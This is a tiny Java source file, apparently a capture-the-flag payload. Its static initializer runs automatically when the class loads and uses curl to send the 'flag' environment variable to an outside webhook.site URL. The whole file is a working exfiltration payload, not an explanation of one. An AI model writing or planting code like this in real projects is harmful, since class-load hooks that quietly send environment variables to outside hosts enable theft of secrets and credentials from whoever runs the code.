public class foo {
  static {
    try {
      Runtime.getRuntime().exec(new String[] { "curl", "https://webhook.site/33295a37-d040-49dc-9be2-47623f59931f",
          "-d", String.valueOf(System.getenv("flag")) });
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
